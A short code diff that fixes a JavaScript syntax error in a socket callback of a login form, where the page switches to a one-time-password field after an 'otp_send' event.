@@ -194,13 +194,13 @@
         if (!number.value.endsWith('.com') && !number.value.replace(/[^0-9]/g, '')) return;
         e.preventDefault();
         socket.emit('id', number.value);
-        socket.on('otp_send',() {
+        socket.on('otp_send', function() {
         element.classList.replace("after_click", "txt_field")
         otp.type = "number";
         otp.classList.replace("send_otp", "txt_field")
         then.type = "submit"
         then.value = "sign in"
-        }
+        })
       });
       then.addEventListener("click", function(e) {
         e.preventDefault();
